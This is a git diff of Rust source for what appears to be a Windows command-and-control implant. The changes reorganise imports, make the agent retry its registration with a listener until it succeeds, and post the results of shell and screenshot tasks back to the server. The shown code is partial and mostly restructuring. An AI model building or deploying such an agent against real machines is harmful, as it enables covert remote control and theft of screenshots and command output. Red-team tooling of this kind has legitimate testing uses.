@@ -5,14 +5,19 @@ use std::{thread, time};
 use windows::core::{Error, HSTRING};
 
 use crate::{
-    agents::AgentData,
-    Config,
-    handlers::win::{
-        async_handler::HRequestAsync,
-        handler::{HConnect, HInternet, HRequest, HSession},
+    core::{
+        agents::AgentData,
+        handlers::win::{
+            async_handler::HRequestAsync,
+            handler::{HConnect, HInternet, HRequest, HSession},
+        },
+        systeminfo::systeminfo_windows::get_computer_name,
+        tasks::{
+            screenshot::screenshot,
+            win::shell::shell,
+        },
     },
-    systeminfo::systeminfo_windows::get_computer_name,
-    tasks::win::{screenshot::screenshot, shell::shell},
+    Config,
     utils::random::random_name,
 };
 
@@ -26,19 +31,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.listener.port,
     )?;
 
-    // Test request hello
-    let response = match get(&mut hconnect, "/".to_string()).await {
-        Ok(resp) => resp,
-        Err(e) => {
-            return Err(e);
-        },
-    };
-
-    println!("{response}");
-
-    thread::sleep(sleep);
-    
-    // Get agent info and register
+    // Get agent info for registration
     let agent_name = random_name("agent".to_owned());
     let hostname = match get_computer_name() {
         Ok(name) => name,
@@ -56,14 +49,23 @@ pub async fn run(config: Config) -> Result<(), Error> {
     let mut ra = AgentData::new(agent_name, hostname, os, arch, listener_url);
     let ra_json = serde_json::to_string(&ra).unwrap();
 
-    // Register agent
-    let response = match post(&mut hconnect, "/reg".to_owned(), ra_json.to_string()).await {
-        Ok(resp) => resp,
-        Err(e) => {
-            return Err(e);
-        }
-    };
-    println!("{response}");
+    // Agent registration process
+    let mut registered = false;
+    while !registered {
+        thread::sleep(sleep);
+    
+        // Register agent
+        let response = match post(&mut hconnect, "/reg".to_owned(), ra_json.to_string()).await {
+            Ok(resp) => {
+                registered = true;
+                resp
+            }
+            Err(e) => {
+                continue;
+            }
+        };
+        println!("{response}");
+    }
 
     loop {
         // TODO: Implement graceful shutdown.
@@ -102,8 +104,6 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         ra.task_result = Some(e.to_string().as_bytes().to_vec());
                     }
                 }
-                // ra.task_result = screenshot().await;
-                // ra.task_result = Some("This is Screenshot.".as_bytes().to_vec());
                 let ra_json = serde_json::to_string(&ra).unwrap();
                 post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
             }
